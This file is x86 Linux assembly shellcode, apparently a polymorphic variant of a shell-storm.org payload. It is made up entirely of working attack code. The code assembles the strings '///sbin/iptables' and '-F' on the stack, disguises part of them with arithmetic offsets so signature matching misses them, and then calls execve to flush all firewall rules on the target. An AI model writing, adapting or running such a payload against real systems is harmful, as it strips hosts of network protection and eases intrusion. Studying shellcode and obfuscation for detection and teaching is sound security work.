;Polymorphic shellcode
;Title:	Iptables -F to flush
;Link: http://shell-storm.org/shellcode/files/shellcode-368.php

global _start
section .text

_start:

;Push '-F'
	xor edx, edx
	push edx			;push 0
	xor eax, eax
	mov ah, 0x46			;push to A-high
	mov al, 0x2d			;push to A-low
	push eax			;push F-
	mov esi, esp			;save on stack

;push 'iptables'
	push edx			;push 0
	mul edx				;zero out EAX
	mov eax, 0x73656c62
	push eax			;push selb
	push word 0x6174		;push at
	push word 0x7069		;push pi
	mov edi, esp			;save on EDI

;push '///sbin/'
	xor eax, eax			;zero out EAX
	mov eax, 0x62a19c95
	sub eax, 0x33333333		;EAX = /nib
	mov dword [esp-4], eax		;push EAX to stack
	mov eax, 0xA6626262
	sub eax, 0x33333333		;EAX = s///
	mov dword [esp-8], eax		;push EAX to stack
	sub esp, 8			;adjust stack pointer
	mov ebx, esp			;save on EBX

;push all to stck for execution
	push edx			;push 0
	push esi			;push argument: -F
	push edi			;push 'iptables'
	mov ecx, esp			;save in ECX

	mul edx				;zero out EAX
	mov al, 0xb			;syscall Execve() into AL
	int 0x80			;Execute Execve
